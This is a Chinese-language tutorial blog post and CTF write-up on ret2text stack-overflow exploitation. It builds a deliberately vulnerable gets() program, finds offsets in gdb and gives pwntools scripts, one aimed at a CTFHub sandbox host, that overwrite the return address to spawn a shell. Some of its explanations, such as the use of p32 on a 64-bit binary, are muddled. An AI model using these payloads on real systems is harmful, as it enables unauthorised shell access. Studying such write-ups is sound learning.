---
layout: post
title:  "ret2text ROP"
date:   2021-06-04 11:45:00 +0800
tags: stackoverflow ROP binary
color: rgb(240,180,90)
cover: '../assets/papercover/cute.png'
subtitle: 'ret2text ROP analyze by yako33!'
---

[TOC]

### ret2text


#### ELF

```
file ./pwn
```

./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9dc32140f0e317f9e6a59b9a226a5123e34ace21, not stripped

在计算机科学中，是一种用于[二进制文件](https://baike.baidu.com/item/二进制文件/996661)、[可执行文件](https://baike.baidu.com/item/可执行文件)、[目标代码](https://baike.baidu.com/item/目标代码/9407934)、共享库和核心转储格式文件。

是UNIX系统实验室（[USL](https://baike.baidu.com/item/USL)）作为应用程序二进制接口（Application Binary Interface，[ABI](https://baike.baidu.com/item/ABI)）而开发和发布的，也是[Linux](https://baike.baidu.com/item/Linux/27050)的主要可执行文件格式。

```
checksec pwn
```

检查保护机制——无保护机制

```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

#### 前言

关于栈溢出漏洞主要的利用方式是ROP(Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到我们想要执行恶意代码的位置中。而跳转的目标有可能是一段本就已经写好的可以执行恶意命令的函数，也有可能是某个全局变量空间，甚至构造一个系统调用的cpu指令，跳转到一个libc中的函数等。最终目的都是执行恶意命令。计算机发展迭代中对于栈溢出的保护手段也越来越完善，限于ALSR，PIP等等，本文对基础的栈溢出进行一些简单的学习。

#### ret2text原理

控制返回地址指向程序本身已有的的代码(.text)并执行

```C++
#include <stdlib.h>
int sys(){
	system("/bin/sh");
}
int func(){
	char a[10];
	gets(a);
	puts(a);
}
int main(){
	func();
}	
```

vim ret2.c编辑一个简单C文件

```
gcc -g -fno-stack-protector -no-pie -o ret2 ret2.c
```

无保护编译，-fno关闭所有栈帧保护

#### 分析

从程序代码上看，分成三个部分，main,func,sys三个函数，sys函数中调用了/bin/sh，函数中，char a为[10]，

gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。

输出字符串时都使用printf，通过“%s”输出字符串,更简单的方法就是使用 puts() 函数。

这里获取输入的char a——gets——puts

程序中获取charA的gets函数无限制的取出char，突破char[10]的限制，造成在缓冲区取数据的时候造成程序溢出

```bash
gdb ret2
```

```
l(L)
```

查看源代码

b gets可以断点到gets函数

```
b 6
```

在第六行添加Int3断点

```
r
```

运行程序

第六行刚刚进入func内部，查看此时程序断下

<ul>
<li  markdown="1" style="list-style-type: none;">
![1]({{site.url}}/screenshot/20210604ret2textROP/1.png)
</li>
</ul>

查看此时的信息，断点位置，反汇编查看sys的地址

```bash
disassemble sys
```

入口地址为0x4005b6也就是sys的地址

```bash
i r rbp
```

```bash
p &a
```

查看当前rbp 变量a的地址

<ul>
<li  markdown="1" style="list-style-type: none;">
![1]({{site.url}}/screenshot/20210604ret2textROP/2.png)
</li>
</ul>

rbp的地址 ffde40  变量a的地址 ffde30 

#### 构造payload

func的返回地址是rbp的地址+8  =  rbp+8 = 0xffde40+8 = 0xffde48

填充a变量直到返回地址，然后讲后面的8个字节的地址改为sys的地址0x4005b6

偏移地址=输入“A”引发程序崩溃，把崩溃地址写入Payload

```python
from pwn import *

p = process("./ret2")
payload = "A" * 24 + p32(0x4005b6)
#payload = "A" * 10
p.sendline(payload)
p.interactive()

```


<ul>
<li  markdown="1" style="list-style-type: none;">
![1]({{site.url}}/screenshot/20210604ret2textROP/3.png)
</li>
</ul>


#### 分析栈帧异常

在溢出中，可以看到stack的分析

gets函数重新指向main函数时，进行了push rbp的操作

<ul>
<li  markdown="1" style="list-style-type: none;">
![1]({{site.url}}/screenshot/20210604ret2textROP/4.png)
</li>
</ul>

也就是说，我们让rbp的地址，指向到sys的地址


#### CTF ret2text

通过ida pro分析

<ul>
<li  markdown="1" style="list-style-type: none;">
![1]({{site.url}}/screenshot/20210604ret2textROP/5.png)
</li>
</ul>


这里也可以上述例子非常的像，gets函数可以引发栈溢出漏洞
在gets函数的跟踪当中可以找到secure F5反汇编

```C++
int secure()
{
  unsigned int v0; // eax
  int result; // eax
  int v2; // [rsp+8h] [rbp-8h] BYREF
  int v3; // [rsp+Ch] [rbp-4h]

  v0 = time(0LL);
  srand(v0);
  v3 = rand();
  __isoc99_scanf(&unk_4008C8, &v2);
  result = v2;
  if ( v3 == v2 )
    result = system("/bin/sh");
  return result;
}
```

此处也调用了/bin/sh的系统命令，也就是我们需要利用这个函数，让异常引发指向他，
需要填充垃圾数据区覆盖原本的ebp的地址，让程序指针指向rbp

适度添加滑块以保证覆盖地址和提高exp命中率

```python
from pwn import *
host = 'challenge-6d9543332f6f24b5.sandbox.ctfhub.com'
port = 22474
#p = process("./pwn")
p = connect(host, port)
payload = 'A' * 0x78 + p64(0x4007b8)
p.sendline(payload)
p.interactive()
```


网上已有非常多的wp，此处给出，连接后查看路径下的flag文件
代码中，python3由于数据要求，p64要求不能直接连接str，会引发EOF错误，这里使用python2，在python2中，如果由于系统原因引发错误，此处可以尝试使用p32()

<ul>
<li  markdown="1" style="list-style-type: none;">
![1]({{site.url}}/screenshot/20210604ret2textROP/6.png)
</li>
</ul>

